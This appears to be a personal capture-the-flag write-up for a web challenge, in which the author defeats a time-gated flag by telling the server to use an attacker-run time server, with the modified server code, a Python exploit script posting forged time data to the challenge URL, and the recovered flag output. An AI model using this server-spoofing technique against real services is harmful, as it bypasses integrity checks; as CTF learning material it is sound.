---
created: 2024-06-22T17:30
updated: 2024-06-22T17:33
---

I went on a large tangent searching for ways to crack the ECC and DSS.

Then I realised that this is a web challenge.

The true solution is to setup my own time server, and just tell the server, to use my own time server.

On my own server, the code has also been altered to allow custom time.

```python
if 'time' in self.path:
	time_query = self.path.split('=')[1]
	timestamp = str(int(time_query)).encode('utf-8')
else:
	timestamp = str(int(time.time())).encode('utf-8')
```

```python
import requests
txt = []
for i in range(12):
    req = requests.get("https://my.server?time=" + str(i*60*60*24+1719090812))
    json_data = req.json()
    json_data["timeserver"] = "my.server"
    response = requests.post("https://web-one-day-one-letter-content-lz56g6.wanictf.org/", json=json_data)
    txt.append(response.text.split("\n")[1])
    txt = [list(row) for row in txt]
    transposed_txt = list(map(list, zip(*txt)))
    print(''.join([next((c for c in l if c!='?'), '?') for l in transposed_txt]))
```

```
<p>Flag is FLAG{l???????????}.</p>
<p>Flag is FLAG{ly??????????}.</p>
<p>Flag is FLAG{lyi?????????}.</p>
<p>Flag is FLAG{lyin????????}.</p>
<p>Flag is FLAG{lying???????}.</p>
<p>Flag is FLAG{lyingt??????}.</p>
<p>Flag is FLAG{lyingth?????}.</p>
<p>Flag is FLAG{lyingthe????}.</p>
<p>Flag is FLAG{lyingthet???}.</p>
<p>Flag is FLAG{lyingtheti??}.</p>
<p>Flag is FLAG{lyingthetim?}.</p>
<p>Flag is FLAG{lyingthetime}.</p>
```
